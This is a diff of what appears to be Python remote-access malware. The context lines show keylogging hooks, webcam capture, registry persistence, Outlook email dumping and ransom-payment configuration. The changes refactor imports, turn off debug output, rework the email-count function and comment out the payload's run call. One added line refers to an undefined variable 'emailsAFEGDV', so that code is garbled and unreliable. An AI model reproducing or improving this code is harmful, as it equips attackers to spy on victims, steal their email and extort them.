@@ -80,9 +80,9 @@ from Crypto.Util.number import long_to_bytes, bytes_to_long
 from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
 
 if os.name is 'nt':
-    import win32com.client
     from pyHook import HookManager
     from pythoncom import PumpMessages, CoInitialize
+    from win32com.client import Dispatch
     from win32com.shell.shell import ShellExecuteEx
     from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
 else:
@@ -107,7 +107,7 @@ class Client(object):
 
     __name__    = 'Client'
     _abort      = False
-    _debug      = True
+    _debug      = False
     _email      = None
     _report     = None
     _tasks      = Queue.Queue()
@@ -249,7 +249,7 @@ class Client(object):
     @staticmethod
     def _get_device():
         try:
-            return os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))
+            return socket.getfqdn(socket.gethostname())
         except Exception as e:
             Client.debug("{} error: {}".format(Client._get_device.func_name, str(e)))
 
@@ -618,7 +618,7 @@ class Client(object):
     def _email_dump(self, n=None, **kwargs):
         try:
             CoInitialize()
-            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = inbox.Items
             if not n:
@@ -672,9 +672,13 @@ class Client(object):
             self.debug("{} error: {}".format(self._email_search.func_name, str(e)))
 
 
-    def _email_emails(self):
+    def _email_count(self):
         try:
-            return "\n\t%d emails in Outlook inbox\n\t%d emails dumped" % (len(inbox), len(self.email.inbox))
+            CoInitialize()
+            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            inbox   = outlook.GetDefaultFolder(6)
+            emails  = inbox.Items
+            return "\n\tEmails in Outlook inbox: %d\n\tEmails dumped from Outlook inbox: %d" % (len(emailsAFEGDV), len(self.email.inbox))
         except Exception as e:
             self.debug("{} error: {}".format(self._email_search.func_name, str(e)))
 
@@ -1999,7 +2003,7 @@ class Client(object):
         if not args:
             try:
                 CoInitialize()
-                installed = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+                installed = Dispatch('Outlook.Application').GetNameSpace('MAPI')
                 return "Outlook is installed on this host"
             except: pass
             return "Outlook not installed on this host"
@@ -2417,7 +2421,7 @@ def main(*args, **kwargs):
             Client._get_new_option('_ransom_payment', account_id=ransom_account_id, api_key=ransom_api_key, api_secret=ransom_api_secret, api_version=ransom_api_version, target_url=ransom_target_url)
     finally:
         payload = Client(**kwargs)
-        payload.run()
+        #payload.run()
         return payload
 
 
